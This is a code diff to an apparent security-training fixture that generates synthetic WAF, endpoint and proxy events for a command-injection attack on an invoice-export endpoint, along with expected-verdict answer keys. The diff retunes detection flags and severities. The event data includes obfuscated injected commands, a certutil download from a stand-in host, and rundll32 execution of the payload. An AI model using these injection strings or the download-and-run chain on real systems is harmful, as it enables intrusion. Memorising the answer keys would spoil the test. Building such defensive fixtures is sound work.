@@ -93,7 +93,7 @@ function pdfExport(): TelemetryEvent[] {
   const exportCmd = (inv: string, name: string) => `cmd.exe /c ${CONVERTER}?id=${inv} "C:\\inetpub\\billing\\exports\\${name}.pdf"`;
   const cmd = (rid: string, min: number, pid: number, inv: string, name: string, extra = {}) => mdeProcess({ id: rid, ts: T(min), ...host, ...id, ...W3WP, processName: "cmd.exe",
     processPath: "C:\\Windows\\System32\\cmd.exe", cmdline: exportCmd(inv, name), pid, signed: true, integrity: "High",
-    severity: "medium", isDetection: true, mitre: "T1059.003", tactic: EXEC, description: `Process started on ${w.host}`, ...extra });
+    severity: "medium", mitre: "T1059.003", tactic: EXEC, description: `Process started on ${w.host}`, ...extra });
   const blocked = (rid: string, min: number, query: string, matched: string, extra = {}) => wafRequest(w, { id: rid, ts: T(min), srcIp: atk, path: "/invoices/export", query, action: "block", rule: "wincmd_query",
     matched, location: "ARGS:name", ua, severity: "medium", mitre: "T1190", tactic: IA, description: "WAF rule matched a Windows command in a query parameter", ...extra });
   const passed = (rid: string, min: number, query: string, extra = {}) => wafRequest(w, { id: rid, ts: T(min), srcIp: atk, path: "/invoices/export", query, action: "allow", status: 500, bytes: 1208, ua,
@@ -102,13 +102,14 @@ function pdfExport(): TelemetryEvent[] {
     description: "Billing site answered an invoice export with an error", ...extra });
   return [
     webAccess(w, { id: "web_cw_001", ts: T(2), srcIp: "198.51.100.37", path: "/invoices/export", query: "id=INV-2026-0912&name=INV-2026-0912", bytes: 184220, ua: CHROME, isBaseline: true, description: "Billing site answered an invoice export" }),
-    { ...cmd("web_cw_002", 2.01, 7340, "INV-2026-0912", "INV-2026-0912"), expected_verdict: "fp" as const,
+    { ...cmd("web_cw_002", 2.01, 7340, "INV-2026-0912", "INV-2026-0912", { isDetection: true }), expected_verdict: "fp" as const,
       fp_explanation: "The export working as built: the site runs its PDF converter through cmd.exe for every invoice, and this command line holds only the converter and one quoted invoice name, with nothing after it." },
     blocked("web_cw_003", 26, "id=INV-2026-0913&name=x%26whoami", "&whoami", { isDetection: true }),
     blocked("web_cw_004", 26.5, "id=INV-2026-0913&name=x%7Cwhoami", "|whoami"),
     passed("web_cw_005", 27, "id=INV-2026-0913&name=x%22%26w%5Eh%5Eo%5Ea%5Em%5Ei%26%22"),
     failed("web_cw_006", 27.01, "id=INV-2026-0913&name=x%22%26w%5Eh%5Eo%5Ea%5Em%5Ei%26%22"),
-    cmd("web_cw_007", 27.02, 7811, "INV-2026-0913", "x\"&w^h^o^a^m^i&\""),
+    // The first unusual tree raises the alert; the later runs are rows of the same investigation.
+    cmd("web_cw_007", 27.02, 7811, "INV-2026-0913", "x\"&w^h^o^a^m^i&\"", { isDetection: true }),
     mdeProcess({ id: "web_cw_008", ts: T(27.03), ...host, ...id, parentName: "cmd.exe", parentPid: 7811, processName: "whoami.exe", processPath: "C:\\Windows\\System32\\whoami.exe", cmdline: "whoami",
       pid: 7822, sha256: makeSha256("windows_system32_whoami_exe_signed_microsoft"), signed: true, integrity: "High", severity: "high", isDetection: true, mitre: "T1033", tactic: DISC, description: `Process started on ${w.host}` }),
     passed("web_cw_009", 31, "id=INV-2026-0913&name=x%22%26c%5Ee%5Er%5Et%5Eu%5Et%5Ei%5El+-urlcache+-split+-f+https%3A%2F%2Ffiles-cdn-update.example%2Fa.dat+C%3A%5CWindows%5CTemp%5Ca.dat%26%22"),
@@ -116,7 +117,7 @@ function pdfExport(): TelemetryEvent[] {
     cmd("web_cw_015", 31.015, 7904, "INV-2026-0913", `x"&c^e^r^t^u^t^i^l -urlcache -split -f https://${cdn}/a.dat C:\\Windows\\Temp\\a.dat&"`, { mitre: "T1105", tactic: C2 }),
     mdeProcess({ id: "web_cw_011", ts: T(31.02), ...host, ...id, parentName: "cmd.exe", parentPid: 7904, processName: "certutil.exe", processPath: "C:\\Windows\\System32\\certutil.exe",
       cmdline: `certutil -urlcache -split -f https://${cdn}/a.dat C:\\Windows\\Temp\\a.dat`, pid: 7915, sha256: makeSha256("windows_system32_certutil_exe_signed_microsoft"), signed: true, integrity: "High",
-      severity: "high", isDetection: true, mitre: "T1105", tactic: C2, description: `Process started on ${w.host}` }),
+      severity: "medium", isDetection: true, mitre: "T1105", tactic: C2, description: `Process started on ${w.host}` }),
     panWeb({ id: "web_cw_012", ts: T(31.05), host: w.host, user: null, srcIp: w.ip, url: `https://${cdn}/a.dat`, domain: cdn, dstIp: cdnIp, category: "unknown", action: "alert", userAgent: "Microsoft-CryptoAPI/10.0",
       bytesIn: 286720, severity: "medium", mitre: "T1105", tactic: C2, description: "Server downloaded a file from an uncategorized domain" }),
     passed("web_cw_016", 33.9, "id=INV-2026-0913&name=x%22%26r%5Eu%5En%5Ed%5El%5El%5E3%5E2+C%3A%5CWindows%5CTemp%5Ca.dat%2CStart%26%22"),
@@ -124,7 +125,7 @@ function pdfExport(): TelemetryEvent[] {
     cmd("web_cw_018", 33.92, 7961, "INV-2026-0913", `x"&r^u^n^d^l^l^3^2 C:\\Windows\\Temp\\a.dat,Start&"`, { mitre: "T1218.011", tactic: STEALTH }),
     mdeProcess({ id: "web_cw_013", ts: T(34), ...host, ...id, parentName: "cmd.exe", parentPid: 7961, processName: "rundll32.exe", processPath: "C:\\Windows\\System32\\rundll32.exe",
       cmdline: "rundll32.exe C:\\Windows\\Temp\\a.dat,Start", pid: 7978, sha256: makeSha256("windows_system32_rundll32_exe_signed_microsoft"), signed: true, integrity: "High",
-      severity: "high", isDetection: true, mitre: "T1218.011", tactic: STEALTH, description: `Process started on ${w.host}` }),
+      severity: "medium", mitre: "T1218.011", tactic: STEALTH, description: `Process started on ${w.host}` }),
     mdeNetwork({ id: "web_cw_014", ts: T(34.2), ...host, remoteIp: c2, remotePort: 443, application: "tls", initiatingProcess: "rundll32.exe", severity: "medium", mitre: "T1071.001", tactic: C2,
       description: `Outbound connection from ${w.host}` }),
   ];
